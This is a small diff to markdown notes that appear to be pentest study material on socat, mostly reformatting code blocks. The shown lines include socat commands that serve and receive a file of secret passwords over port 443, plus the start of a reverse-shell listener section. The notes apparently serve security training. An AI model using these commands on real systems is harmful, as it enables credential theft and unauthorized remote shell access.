@@ -195,14 +195,16 @@ Alice need to send Bob
  - On Linux 
      ```bash
      sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
- ```
+    ```
  - On Windows
      ```bash
         socat TCP4:10.11.0.4.:443 file:received_secret_passwords.txt,create
      ```
----
+
 ## Socat Reverse Shells
+
 - On window
+
    ```bash
     socat -d TCP4-LISTEN:443 STDOUT
    ```
